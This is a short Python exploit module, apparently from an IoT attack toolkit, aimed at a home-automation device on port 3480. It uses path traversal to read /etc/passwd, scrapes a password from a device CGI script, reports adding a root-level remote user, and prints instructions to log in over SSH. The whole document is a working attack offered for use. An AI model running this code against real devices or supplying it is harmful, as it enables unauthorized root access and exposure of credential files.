def execute(self, ip):
    """sucasa ipaddress"""

     # Credit: Ben Reichert of Xipiter, LLC
    import urllib2

    print("[+] grabbing /etc/passwd...\n")
    url = "http://"+str(ip)+":3480/data_request?id=file&parameters=../../etc/passwd"
    print(urllib2.urlopen(url).read())


    url = "http://"+str(ip)+"/cgi-bin/cmh/tech_ra.sh"
    password = str(urllib2.urlopen(url).read().split("-")[1].split(" to the")[0])
    print("[+] adding remote user, uid=0,gid=0, password = {0}".format(password))

    print("[+] new /etc/passwd...\n")
    url = "http://"+str(ip)+":3480/data_request?id=file&parameters=../../etc/passwd"
    print(urllib2.urlopen(url).read())

    print("[+] please exit idIOTic, and enter 'ssh remote@{0}' and then enter the password {1}".format(ip,password))

